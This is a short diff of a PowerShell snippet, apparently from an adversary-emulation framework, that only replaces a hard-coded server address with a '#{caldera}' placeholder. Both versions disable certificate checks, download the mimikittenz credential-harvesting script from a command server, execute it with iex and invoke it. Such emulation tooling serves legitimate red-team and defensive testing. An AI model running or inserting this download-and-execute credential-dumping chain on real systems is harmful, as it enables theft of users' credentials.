@@ -13,5 +13,5 @@
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
         $web = (New-Object System.Net.WebClient)
         $web.Headers.add("file","invoke-mimikittenz-ps1")
-        $result = $web.uploadString("https://10.0.2.2:8888/file/download","")
+        $result = $web.uploadString("#{caldera}/file/download","")
         iex $result; Invoke-MimiKittenz
